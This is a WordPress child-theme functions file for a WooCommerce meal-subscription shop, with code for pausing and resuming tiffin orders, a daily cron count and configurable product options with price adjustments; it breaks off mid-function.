<?php
// Enqueue parent and child theme styles
function my_child_theme_enqueue_styles() {
    // Load parent theme stylesheet first
    wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
    
    // Load child theme stylesheet
    wp_enqueue_style('child-style', get_stylesheet_uri(), array('parent-style'));
}
add_action('wp_enqueue_scripts', 'my_child_theme_enqueue_styles');
?>



<?php
// Advanced Product Options Integration
// Exit if accessed directly

if (!defined('ABSPATH')) {
    exit;
}
////////////////////////////
//  Auto Resume Funtion   //
///////////////////////////
// Add manual check option in admin
function add_manual_resume_check() {
    if (isset($_GET['check_paused_orders']) && current_user_can('manage_options')) {
        check_paused_orders();
        wp_redirect(admin_url('admin.php?page=pause-management&checked=1'));
        exit;
    }
}
add_action('admin_init', 'add_manual_resume_check');

// Add notice for manual check completion
function show_resume_check_notice() {
    if (isset($_GET['checked'])) {
        ?>
        <div class="notice notice-success is-dismissible">
            <p><?php _e('Paused orders have been checked and processed.', 'woocommerce'); ?></p>
        </div>
        <?php
    }
}
add_action('admin_notices', 'show_resume_check_notice');

// Add manual check button to pause management page
function add_check_paused_orders_button($content) {
    $screen = get_current_screen();
    if ($screen->id === 'toplevel_page_pause-management') {
        $check_url = add_query_arg('check_paused_orders', '1', admin_url('admin.php'));
        echo '<div class="wrap">';
        echo '<h1>Pause Management</h1>';
        echo '<a href="' . esc_url($check_url) . '" class="page-title-action">';
        echo __('Check Paused Orders', 'woocommerce');
        echo '</a>';
        echo '</div>';
    }
}
add_action('admin_notices', 'add_check_paused_orders_button');


////////////////////////////
// Auto Resume Funtion End //
///////////////////////////


// Add AJAX handler for saving pause dates
function handle_save_pause_dates() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized');
        return;
    }

    $order_id = intval($_POST['order_id']);
    $dates = array_map('sanitize_text_field', $_POST['dates']);

    $order = wc_get_order($order_id);
    if (!$order) {
        wp_send_json_error('Invalid order');
        return;
    }

    update_post_meta($order_id, '_paused_dates', $dates);
    $order->update_status('paused');

    wp_send_json_success();
}
add_action('wp_ajax_save_pause_dates', 'handle_save_pause_dates');


// Handle tiffin resume
function handle_resume_tiffin() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Unauthorized');
        return;
    }

    $order_id = intval($_POST['order_id']);
    $order = wc_get_order($order_id);
    
    if (!$order) {
        wp_send_json_error('Invalid order');
        return;
    }

    try {
        // Remove paused dates
        delete_post_meta($order_id, '_paused_dates');
        
        // Update order status back to processing
        $order->update_status('processing');
        
        // Add success notification
        add_action('admin_notices', function() {
            ?>
            <div class="notice notice-success is-dismissible">
                <p><?php _e('Tiffin service has been resumed successfully.', 'woocommerce'); ?></p>
            </div>
            <?php
        });
        
        wp_send_json_success();
    } catch (Exception $e) {
        wp_send_json_error($e->getMessage());
    }
}
add_action('wp_ajax_resume_tiffin', 'handle_resume_tiffin');

// Add custom action for resume events
function handle_tiffin_resume($order_id) {
    // Additional processing can be added here
    do_action('after_tiffin_resume', $order_id);
}
add_action('resume_tiffin', 'handle_tiffin_resume');

// Enqueue admin scripts and styles for pause management
function enqueue_pause_management_scripts($hook) {
    if ('toplevel_page_pause-management' !== $hook && 'pause-management_page_paused-tiffins' !== $hook) {
        return;
    }

    // Enqueue jQuery UI
    wp_enqueue_script('jquery-ui-core');
    wp_enqueue_script('jquery-ui-datepicker');
    wp_enqueue_style('jquery-ui-style', '//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');

    // Enqueue Multi Date Picker
    wp_enqueue_script(
        'jquery-ui-multidatepicker',
        get_stylesheet_directory_uri() . '/js/jquery-ui.multidatespicker.js',
        array('jquery-ui-datepicker'),
        '1.6.6',
        true
    );

    // Enqueue custom scripts and styles
    wp_enqueue_script(
        'pause-management',
        get_stylesheet_directory_uri() . '/js/pause-management.js',
        array('jquery', 'jquery-ui-multidatepicker'),
        '1.0',
        true
    );

    wp_enqueue_style(
        'pause-management',
        get_stylesheet_directory_uri() . '/css/pause-management.css',
        array(),
        '1.0'
    );
}
add_action('admin_enqueue_scripts', 'enqueue_pause_management_scripts');

// Add custom CSS for pause management
function add_pause_management_styles() {
    ?>
    <style>
        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.4);
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 500px;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        /* Date picker styles */
        .ui-datepicker-calendar .ui-state-disabled {
            opacity: 0.35;
        }

        .ui-datepicker-calendar .ui-state-active {
            background: #007cba !important;
            color: white !important;
        }

        /* Button styles */
        .pause-tiffin-btn,
        .resume-tiffin-btn {
            margin: 2px;
        }

        #save-pause-dates {
            margin-top: 15px;
            float: right;
        }

        /* Table styles */
        .wp-list-table th {
            font-weight: 600;
        }

        .wp-list-table td {
            vertical-align: middle;
        }
    </style>
    <?php
}
add_action('admin_head', 'add_pause_management_styles');

// Add custom order status color
function add_paused_status_color($statuses) {
    $statuses['wc-paused'] = array(
        'label'  => _x('Paused', 'Order status', 'woocommerce'),
        'color'  => '#f4a460' // Sandy brown color
    );
    return $statuses;
}
add_filter('wc_order_statuses_colors', 'add_paused_status_color');

// Modify order status label in admin order list
function modify_paused_order_status_label($order_statuses) {
    $order_statuses['wc-paused'] = _x('Paused', 'Order status', 'woocommerce');
    return $order_statuses;
}
add_filter('wc_order_statuses', 'modify_paused_order_status_label');

// Add custom column to orders table for paused dates
function add_order_paused_dates_column($columns) {
    $new_columns = array();
    foreach ($columns as $key => $column) {
        $new_columns[$key] = $column;
        if ($key === 'order_status') {
            $new_columns['paused_dates'] = __('Paused Dates', 'woocommerce');
        }
    }
    return $new_columns;
}
add_filter('manage_edit-shop_order_columns', 'add_order_paused_dates_column', 20);

// Display paused dates in orders table
function display_order_paused_dates_column($column) {
    global $post;

    if ($column === 'paused_dates') {
        $order = wc_get_order($post->ID);
        if ($order->get_status() === 'paused') {
            $paused_dates = get_post_meta($post->ID, '_paused_dates', true);
            if (is_array($paused_dates)) {
                echo implode(', ', $paused_dates);
            }
        }
    }
}
add_action('manage_shop_order_posts_custom_column', 'display_order_paused_dates_column');

// Add pause dates to order notes
function add_pause_dates_order_note($order_id, $dates) {
    $order = wc_get_order($order_id);
    $dates_str = implode(', ', $dates);
    $order->add_order_note(
        sprintf(__('Tiffin delivery paused for the following dates: %s', 'woocommerce'), $dates_str),
        0, // Customer-facing note
        true // Added by system
    );
}
add_action('save_pause_dates', 'add_pause_dates_order_note', 10, 2);

// Add resume note to order
function add_resume_order_note($order_id) {
    $order = wc_get_order($order_id);
    $order->add_order_note(
        __('Tiffin delivery resumed', 'woocommerce'),
        0, // Customer-facing note
        true // Added by system
    );
}
add_action('resume_tiffin', 'add_resume_order_note');

// Validate pause dates before saving
function validate_pause_dates($dates, $order_id) {
    $order = wc_get_order($order_id);
    $remaining_tiffins = Satguru_Tiffin_Calculator::calculate_remaining_tiffins($order);
    
    if (count($dates) > $remaining_tiffins) {
        return new WP_Error('invalid_dates', 
            sprintf(__('Cannot pause more dates than remaining tiffins (%d)', 'woocommerce'), 
            $remaining_tiffins)
        );
    }
    
    return true;
}
add_filter('pre_save_pause_dates', 'validate_pause_dates', 10, 2);

// Include pause management functionality
require_once get_stylesheet_directory() . '/pause-management.php';

// Include customers page functionality
require_once get_stylesheet_directory() . '/customers-page.php';
require_once get_stylesheet_directory() . '/renewals-page.php';

// Create database table and import customers on theme activation
register_activation_hook(__FILE__, 'create_customers_data_table');
register_activation_hook(__FILE__, 'import_existing_customers');

// Ensure table exists even if activation hook didn't run
add_action('init', 'ensure_customers_table_exists');

function ensure_customers_table_exists() {
    // Check if table exists
    global $wpdb;
    $table_name = $wpdb->prefix . 'customers_data';
    
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        create_customers_data_table();
        import_existing_customers();
    }
}

//

// Schedule daily tiffin count save at 11 PM EST
if (!wp_next_scheduled('save_daily_tiffin_count')) {
    // Convert 11 PM EST to timestamp
    $est_timezone = new DateTimeZone('America/New_York');
    $est_time = new DateTime('today 23:00:00', $est_timezone);
    $gmt_time = $est_time->getTimestamp();
    
    // Schedule the event
    wp_schedule_event($gmt_time, 'daily', 'save_daily_tiffin_count');
}

// Hook for the cron job
add_action('save_daily_tiffin_count', function() {
    Satguru_Tiffin_Calculator::save_daily_tiffin_count();
});

// Make sure the cron job runs when delivery days are updated 
add_action('update_option_satguru_delivery_start_day', 'trigger_tiffin_count_save');
add_action('update_option_satguru_delivery_end_day', 'trigger_tiffin_count_save');

function trigger_tiffin_count_save() {
    Satguru_Tiffin_Calculator::save_daily_tiffin_count();
}

// Include admin dashboard functionality
require_once get_stylesheet_directory() . '/admin-dashboard.php';
require_once get_stylesheet_directory() . '/admin-settings.php';
require_once get_stylesheet_directory() . '/add-order.php';

// Enqueue custom styles for product page
function enqueue_custom_product_styles() {
    if (is_product()) {
        wp_enqueue_style('custom-product-styles', get_stylesheet_directory_uri() . '/css/custom-product-page.css', array(), '1.0.0');
    }
}
add_action('wp_enqueue_scripts', 'enqueue_custom_product_styles');
// customer page funtion start // 




// customer product page funtion end // 



// Add image upload option for custom button designs
function apo_add_image_upload_option() {
    add_action('admin_enqueue_scripts', 'apo_enqueue_media_uploader');
    add_action('edit_form_after_title', 'apo_add_image_upload_field');
    add_action('save_post', 'apo_save_image_upload_field');
}
add_action('init', 'apo_add_image_upload_option');

function apo_enqueue_media_uploader() {
    wp_enqueue_media();
    wp_enqueue_script('apo-media-upload', get_stylesheet_directory_uri() . '/js/media-upload.js', array('jquery'), '1.0', true);
}

function apo_add_image_upload_field($post) {
    if ($post->post_type !== 'apo_option_group') return;

    $image_id = get_post_meta($post->ID, '_apo_custom_button_image', true);
    $image_url = $image_id ? wp_get_attachment_url($image_id) : '';
    ?>
    <div class="apo-image-upload">
        <label for="apo_custom_button_image">Custom Button Image:</label>
        <input type="hidden" name="apo_custom_button_image" id="apo_custom_button_image" value="<?php echo esc_attr($image_id); ?>">
        <img src="<?php echo esc_url($image_url); ?>" style="max-width: 100px; display: <?php echo $image_url ? 'block' : 'none'; ?>;">
        <button type="button" class="button" id="apo_upload_image_button">Upload Image</button>
        <button type="button" class="button" id="apo_remove_image_button" style="display: <?php echo $image_url ? 'inline-block' : 'none'; ?>;">Remove Image</button>
    </div>
    <?php
}

function apo_save_image_upload_field($post_id) {
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;
    if (!current_user_can('edit_post', $post_id)) return;

    if (isset($_POST['apo_custom_button_image'])) {
        update_post_meta($post_id, '_apo_custom_button_image', sanitize_text_field($_POST['apo_custom_button_image']));
    }
}


// Enqueue admin scripts and styles for pause management
function apo_enqueue_scripts() {
    // Enqueue the main APO styles
    wp_enqueue_style(
        'apo-styles',
        get_stylesheet_directory_uri() . '/css/apo-styles.css',
        array(),
        '1.0'
    );

    // Enqueue Flatpickr CSS and JS
    wp_enqueue_style(
        'flatpickr-css',
        'https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css',
        array(),
        '4.6.13'
    );
    
    // Optional: Enqueue a theme (this one matches your example better)
    wp_enqueue_style(
        'flatpickr-theme',
        'https://cdn.jsdelivr.net/npm/flatpickr/dist/themes/airbnb.css',
        array('flatpickr-css'),
        '4.6.13'
    );

    wp_enqueue_script(
        'flatpickr-js',
        'https://cdn.jsdelivr.net/npm/flatpickr',
        array('jquery'),
        '4.6.13',
        true
    );

    // Your custom JS file
    wp_enqueue_script(
        'apo-scripts',
        get_stylesheet_directory_uri() . '/js/apo-scripts.js',
        array('jquery', 'flatpickr-js'),
        '1.0',
        true
    );

    // Only load these scripts on product pages
    if (is_product()) {
        // Enqueue jQuery UI
        wp_enqueue_script('jquery-ui-core');
        wp_enqueue_script('jquery-ui-datepicker');
        wp_enqueue_style('jquery-ui-style', '//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');

        // Enqueue custom scripts
        wp_enqueue_script(
            'apo-scripts',
            get_stylesheet_directory_uri() . '/js/apo-scripts.js',
            array('jquery', 'jquery-ui-datepicker'),
            '1.0',
            true
        );
    }
}
add_action('wp_enqueue_scripts', 'apo_enqueue_scripts');



// Initialize the custom post type for option groups
function apo_init() {
    register_post_type('apo_option_group', array(
        'labels' => array(
            'name' => 'Option Groups',
            'singular_name' => 'Option Group',
        ),
        'public' => false,
        'show_ui' => true,
        'show_in_menu' => 'edit.php?post_type=product',
        'supports' => array('title'),
    ));
}
add_action('init', 'apo_init');

// Add meta box for option groups
function apo_add_meta_box() {
    add_meta_box(
        'apo_option_group_meta_box',
        'Product Options',
        'apo_option_group_meta_box_callback',
        'apo_option_group',
        'normal',
        'default'
    );
}
add_action('add_meta_boxes', 'apo_add_meta_box');

// Add a new meta box for product selection
function apo_add_product_selection_meta_box() {
    add_meta_box(
        'apo_product_selection_meta_box',
        'Select Products',
        'apo_product_selection_meta_box_callback',
        'apo_option_group',
        'side',
        'default'
    );
}
add_action('add_meta_boxes', 'apo_add_product_selection_meta_box');


// Callback function for the product selection meta box
function apo_product_selection_meta_box_callback($post) {
    wp_nonce_field('apo_save_product_selection', 'apo_product_selection_nonce');

    $selected_products = get_post_meta($post->ID, '_apo_selected_products', true);
    if (!is_array($selected_products)) {
        $selected_products = array();
    }

    $products = wc_get_products(array('status' => 'publish', 'limit' => -1));

    echo '<select name="apo_selected_products[]" multiple style="width: 100%; height: 200px;">';
    foreach ($products as $product) {
        $selected = in_array($product->get_id(), $selected_products) ? 'selected' : '';
        echo '<option value="' . esc_attr($product->get_id()) . '" ' . $selected . '>' . esc_html($product->get_name()) . '</option>';
    }
    echo '</select>';
    echo '<p>Hold Ctrl (Windows) or Cmd (Mac) to select multiple products.</p>';
}

// Meta box callback
function apo_option_group_meta_box_callback($post) {
    wp_nonce_field('apo_save_meta_box_data', 'apo_meta_box_nonce');

    $options = get_post_meta($post->ID, '_apo_options', true);
    if (!is_array($options)) {
        $options = array();
    }

    ?>
    <div id="apo_options">
        <?php foreach ($options as $index => $option) : ?>
            <?php apo_render_option_fields($option, $index); ?>
        <?php endforeach; ?>
    </div>
    <button type="button" id="add_option" class="button">Add Option</button>

    <script>
    jQuery(document).ready(function($) {
        var optionIndex = <?php echo count($options); ?>;

        $('#add_option').on('click', function() {
            var newOption = <?php echo json_encode(apo_get_empty_option()); ?>;
            var optionHtml = apo_render_option_fields_js(newOption, optionIndex);
            $('#apo_options').append(optionHtml);
            optionIndex++;
        });

        $('#apo_options').on('click', '.remove-option', function() {
            $(this).closest('.apo-option').remove();
        });

        $(document).on('change', '.apo-option-type', function() {
            var $option = $(this).closest('.apo-option');
            var type = $(this).val();
            if (type === 'image') {
                $option.find('.apo-image-upload').show();
            } else {
                $option.find('.apo-image-upload').hide();
            }
        });
    });

    function apo_render_option_fields_js(option, index) {
        var html = '<div class="apo-option">';
        html += '<p><label>Option Name: <input type="text" name="apo_option_name[]" value="' + (option.name || '') + '" required></label></p>';
        html += '<p><label>Option Type: <select name="apo_option_type[]" class="apo-option-type">';
        var types = ['radio', 'checkbox', 'select', 'text', 'date', 'image'];
        types.forEach(function(type) {
            html += '<option value="' + type + '"' + (option.type === type ? ' selected' : '') + '>' + type.charAt(0).toUpperCase() + type.slice(1) + '</option>';
        });
        html += '</select></label></p>';
        html += '<p><label>Required: <input type="checkbox" name="apo_option_required[]" value="1"' + (option.required ? ' checked' : '') + '></label></p>';
        html += '<p><label>Choices and Price Adjustments:<br><textarea name="apo_option_choices_and_prices[]" rows="5" cols="50" placeholder="Choice|Price or Choice|*Multiplier">' + (option.choices ? option.choices.map((choice, i) => choice + '|' + (option.price_multipliers[i] || '')).join("\n") : '') + '</textarea></label></p>';
        html += '<div class="apo-image-upload" style="display: ' + (option.type === 'image' ? 'block' : 'none') + ';">';
        html += '<p><label>Custom Image: <input type="hidden" name="apo_option_custom_image[]" class="apo-custom-image-id" value="' + (option.custom_image || '') + '"></label></p>';
        html += '<img src="" class="apo-custom-image-preview" style="max-width: 100px; display: none;">';
        html += '<button type="button" class="button apo-upload-custom-image">Upload Image</button>';
        html += '<button type="button" class="button apo-remove-custom-image" style="display: none;">Remove Image</button>';
        html += '</div>';
        html += '<button type="button" class="button remove-option">Remove Option</button>';
        html += '</div>';
        return html;
    }
    </script>
    <?php
}

function apo_render_option_fields($option, $index) {
    ?>
    <div class="apo-option">
        <p>
            <label>Option Name: <input type="text" name="apo_option_name[]" value="<?php echo esc_attr($option['name']); ?>" required></label>
        </p>
        <p>
            <label>Option Type:
                <select name="apo_option_type[]" class="apo-option-type">
                    <option value="radio" <?php selected($option['type'], 'radio'); ?>>Radio Buttons</option>
                    <option value="checkbox" <?php selected($option['type'], 'checkbox'); ?>>Checkboxes</option>
                    <option value="select" <?php selected($option['type'], 'select'); ?>>Dropdown</option>
                    <option value="text" <?php selected($option['type'], 'text'); ?>>Text Input</option>
                    <option value="date" <?php selected($option['type'], 'date'); ?>>Date Picker</option>
                    <option value="image" <?php selected($option['type'], 'image'); ?>>Image Buttons</option>
                </select>
            </label>
        </p>
        <p>
            <label>Required: <input type="checkbox" name="apo_option_required[]" value="1" <?php checked($option['required'], true); ?>></label>
        </p>
        <p>
            <label>Choices and Price Adjustments:<br>
                <small>Format: Choice|Price or Choice|*Multiplier (e.g., "Large|2.00" or "Double|*2")</small><br>
                <textarea name="apo_option_choices_and_prices[]" rows="5" cols="50" placeholder="Choice|Price or Choice|*Multiplier"><?php 
                    $choices_and_prices = array();
                    foreach ($option['choices'] as $key => $choice) {
                        $adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                        $multiplier = isset($option['price_multipliers'][$key]) ? $option['price_multipliers'][$key] : '';
                        
                        if ($multiplier) {
                            $choices_and_prices[] = $choice . '|*' . $multiplier;
                        } else {
                            $choices_and_prices[] = $choice . '|' . $adjustment;
                        }
                    }
                    echo esc_textarea(implode("\n", $choices_and_prices)); 
                ?></textarea>
            </label>
        </p>
        <div class="apo-image-upload" style="display: <?php echo $option['type'] === 'image' ? 'block' : 'none'; ?>;">
            <p>
                <label>Custom Image: 
                    <input type="hidden" name="apo_option_custom_image[]" class="apo-custom-image-id" value="<?php echo esc_attr($option['custom_image'] ?? ''); ?>">
                </label>
            </p>
            <?php 
            $image_url = wp_get_attachment_image_url($option['custom_image'] ?? '', 'thumbnail');
            $image_style = $image_url ? '' : 'display: none;';
            $remove_style = $image_url ? '' : 'display: none;';
            ?>
            <img src="<?php echo esc_url($image_url); ?>" class="apo-custom-image-preview" style="max-width: 100px; <?php echo $image_style; ?>">
            <button type="button" class="button apo-upload-custom-image">Upload Image</button>
            <button type="button" class="button apo-remove-custom-image" style="<?php echo $remove_style; ?>">Remove Image</button>
        </div>
        <button type="button" class="button remove-option">Remove Option</button>
    </div>
    <?php
}

function apo_get_empty_option() {
    return array(
        'id' => uniqid(),
        'name' => '',
        'type' => 'radio',
        'required' => false,
        'choices' => array(),
        'price_adjustments' => array(),
        'price_multipliers' => array(),
        'custom_image' => '',
    );
}

// Save meta box data
function apo_save_meta_box_data($post_id) {
    if (!isset($_POST['apo_meta_box_nonce'])) {
        return;
    }

    if (!wp_verify_nonce($_POST['apo_meta_box_nonce'], 'apo_save_meta_box_data')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    $options = array();

    if (isset($_POST['apo_option_name'])) {
        $names = $_POST['apo_option_name'];
        $types = $_POST['apo_option_type'];
        $required = isset($_POST['apo_option_required']) ? $_POST['apo_option_required'] : array();
        $choices_and_prices = $_POST['apo_option_choices_and_prices'];

        for ($i = 0; $i < count($names); $i++) {
            $choices = array();
            $price_adjustments = array();
            $price_multipliers = array();
            
            $lines = explode("\n", sanitize_textarea_field($choices_and_prices[$i]));
            foreach ($lines as $line) {
                $parts = explode('|', trim($line));
                if (count($parts) == 2) {
                    $choices[] = $parts[0];
                    
                    // Check if it's a multiplier (starts with *)
                    if (strpos($parts[1], '*') === 0) {
                        $multiplier = floatval(substr($parts[1], 1));
                        $price_multipliers[] = $multiplier;
                        $price_adjustments[] = 0;
                    } else {
                        $price_adjustments[] = floatval($parts[1]);
                        $price_multipliers[] = '';
                    }
                }
            }

            $options[] = array(
                'id' => uniqid(),
                'name' => sanitize_text_field($names[$i]),
                'type' => sanitize_text_field($types[$i]),
                'required' => isset($required[$i]),
                'choices' => $choices,
                'price_adjustments' => $price_adjustments,
                'price_multipliers' => $price_multipliers,
            );
        }
    }

    update_post_meta($post_id, '_apo_options', $options);
}
add_action('save_post_apo_option_group', 'apo_save_meta_box_data');

// Save the selected products
function apo_save_product_selection($post_id) {
    if (!isset($_POST['apo_product_selection_nonce']) || !wp_verify_nonce($_POST['apo_product_selection_nonce'], 'apo_save_product_selection')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    if (isset($_POST['apo_selected_products'])) {
        $selected_products = array_map('intval', $_POST['apo_selected_products']);
        update_post_meta($post_id, '_apo_selected_products', $selected_products);
    } else {
        delete_post_meta($post_id, '_apo_selected_products');
    }
}
add_action('save_post_apo_option_group', 'apo_save_product_selection');

// Enqueue admin scripts
function apo_enqueue_admin_scripts($hook) {
    global $post;

    if ($hook == 'post-new.php' || $hook == 'post.php') {
        if ('apo_option_group' === $post->post_type) {
            wp_enqueue_media();
            wp_enqueue_script('apo-admin-script', get_stylesheet_directory_uri() . '/js/apo-admin.js', array('jquery'), '1.0', true);
        }
    }
}
add_action('admin_enqueue_scripts', 'apo_enqueue_admin_scripts');

// Display options on the product page
function apo_display_product_options() {
    global $product;

    if (!$product) {
        return;
    }

    $product_id = $product->get_id();

    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            if (!empty($options)) {
                echo '<div class="apo-option-group">';
                echo '<h3>' . esc_html($group->post_title) . '</h3>';
                echo '<div class="apo-options-container">'; // New container for grid layout
                foreach ($options as $option) {
                    apo_render_option($option);
                }
                echo '</div>'; // Close grid container
                echo '</div>';
            }
        }
    }
}
add_action('woocommerce_before_add_to_cart_button', 'apo_display_product_options');

///////////////////////////////////////////////////////////////
// THIS OPTION IS CHANAGED IF REQUIRED CHANGE IT ORIGINAL ONE 
//////////////////////////////////////////////////////////////


// Render individual option
function apo_render_option($option) {
    $required = $option['required'] ? 'required' : '';
    $name = 'apo_' . $option['id'];
    
    echo '<div class="apo-option">';
    echo '<label>' . esc_html($option['name']) . ($option['required'] ? ' <span class="required">*</span>' : '') . '</label>';

    switch ($option['type']) {
        case 'radio':
            foreach ($option['choices'] as $key => $choice) {
                $price_adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                echo '<label class="radio-label">';
                echo '<input type="radio" name="' . esc_attr($name) . '" value="' . esc_attr($choice) . '" ' . $required . '>';
                echo '<span>' . esc_html($choice);
                if ($price_adjustment != 0) {
                    echo ' <span class="price-adjustment">(' . wc_price($price_adjustment) . ')</span>';
                }
                echo '</span>';
                echo '</label>';
            }
            break;
            
            case 'select':
                echo '<select name="' . esc_attr($name) . '" ' . $required . ' class="form-select">';
                echo '<option value="">Select ' . esc_html($option['name']) . '</option>';
                foreach ($option['choices'] as $key => $choice) {
                    $price_adjustment = isset($option['price_adjustments'][$key]) ? $option['price_adjustments'][$key] : 0;
                    echo '<option value="' . esc_attr($choice) . '">';
                    echo esc_html($choice);
                    if ($price_adjustment != 0) {
                        echo ' (' . wc_price($price_adjustment) . ')';
                    }
                    echo '</option>';
                }
                echo '</select>';
                break;
            
        case 'text':
            echo '<input type="text" name="' . esc_attr($name) . '" placeholder="Enter ' . esc_attr($option['name']) . '" ' . $required . '>';
            break;
            
        case 'date':
            echo '<input type="text" name="' . esc_attr($name) . '" class="apo-datepicker" placeholder="Select ' . esc_attr($option['name']) . '" ' . $required . '>';
            break;
    }
    
    echo '</div>';
}

///////////////////////////////////////////////////////////////
// THIS OPTION IS CHANAGED IF REQUIRED CHANGE IT ORIGINAL ONE 
//////////////////////////////////////////////////////////////

// Validate date
function apo_validate_date($date) {
    $today = new DateTime();
    $selected_date = new DateTime($date);
    $day_of_week = $selected_date->format('N');

    // Check if the date is today or in the past
    if ($selected_date <= $today) {
        return false;
    }

    // Check if the date is a weekend (6 = Saturday, 7 = Sunday)
    if ($day_of_week >= 6) {
        return false;
    }

    return true;
}

// Add to cart validation
function apo_add_to_cart_validation($passed, $product_id, $quantity) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        // Check if the current product is selected for this option group
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($options as $option) {
                $option_value = isset($_POST['apo_' . $option['id']]) ? $_POST['apo_' . $option['id']] : '';

                if ($option['required'] && empty($option_value)) {
                    wc_add_notice(sprintf(__('%s is a required field.', 'advanced-product-options'), $option['name']), 'error');
                    $passed = false;
                }

                if ($option['type'] === 'date' && !empty($option_value)) {
                    if (!apo_validate_date($option_value)) {
                        wc_add_notice(sprintf(__('%s must be a future date (Monday to Friday).', 'advanced-product-options'), $option['name']), 'error');
                        $passed = false;
                    }
                }
            }
        }
    }

    return $passed;
}
add_filter('woocommerce_add_to_cart_validation', 'apo_add_to_cart_validation', 10, 3);


// Add custom data to cart item
function apo_add_cart_item_data($cart_item_data, $product_id, $variation_id) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        // Check if the current product is selected for this option group
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($options as $option) {
                if (isset($_POST['apo_' . $option['id']])) {
                    $cart_item_data['apo_options'][$option['id']] = $_POST['apo_' . $option['id']];
                }
            }
        }
    }

    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'apo_add_cart_item_data', 10, 3);

// Add custom options to order item meta
function apo_add_order_item_meta($item, $cart_item_key, $values, $order) {
    if (isset($values['apo_options'])) {
        foreach ($values['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                $display_value = is_array($value) ? implode(', ', $value) : $value;

                // Check for both price adjustment and multiplier
                $price_adjustment = 0;
                $multiplier = '';
                
                if (in_array($option['type'], array('radio', 'select', 'image'))) {
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $multiplier = $option['price_multipliers'][$choice_key];
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $price_adjustment = $option['price_adjustments'][$choice_key];
                        }
                    }
                }

                // Add meta data with appropriate price information
                if ($multiplier) {
                    $item->add_meta_data(
                        $option['name'],
                        $display_value . ' (×' . $multiplier . ')'
                    );
                } else if ($price_adjustment != 0) {
                    $item->add_meta_data(
                        $option['name'],
                        $display_value . ' (' . wc_price($price_adjustment) . ')'
                    );
                } else {
                    $item->add_meta_data($option['name'], $display_value);
                }
            }
        }
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'apo_add_order_item_meta', 10, 4);


// Add this new function to display cart item data
function apo_get_item_data($item_data, $cart_item) {
    if (isset($cart_item['apo_options']) && !empty($cart_item['apo_options'])) {
        foreach ($cart_item['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                $display_value = is_array($value) ? implode(', ', $value) : $value;

                // Check for both price adjustment and multiplier
                $price_adjustment = 0;
                $multiplier = '';
                
                if (in_array($option['type'], array('radio', 'select', 'image'))) {
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $multiplier = $option['price_multipliers'][$choice_key];
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $price_adjustment = $option['price_adjustments'][$choice_key];
                        }
                    }
                }

                // Create display text with appropriate price information
                $display = $display_value;
                if ($multiplier) {
                    $display .= ' (×' . $multiplier . ')';
                } else if ($price_adjustment != 0) {
                    $display .= ' (' . wc_price($price_adjustment) . ')';
                }

                $item_data[] = array(
                    'key'     => $option['name'],
                    'value'   => $display_value,
                    'display' => $display
                );
            }
        }
    }
    return $item_data;
}
add_filter('woocommerce_get_item_data', 'apo_get_item_data', 10, 2);


// Display custom options in order details
function apo_display_order_item_meta($item_id, $item, $order) {
    $meta_data = $item->get_meta_data();
    foreach ($meta_data as $meta) {
        if (strpos($meta->key, 'apo_') === 0) {
            echo '<p><strong>' . esc_html(substr($meta->key, 4)) . ':</strong> ' . esc_html($meta->value) . '</p>';
        }
    }
}
add_action('woocommerce_order_item_meta_end', 'apo_display_order_item_meta', 10, 3);

// Add AJAX handler for updating product price
function apo_update_price() {
    if (!isset($_POST['product_id']) || !isset($_POST['options'])) {
        wp_send_json_error('Invalid request');
    }

    $product_id = intval($_POST['product_id']);
    $product = wc_get_product($product_id);
    $base_price = $product->get_price();

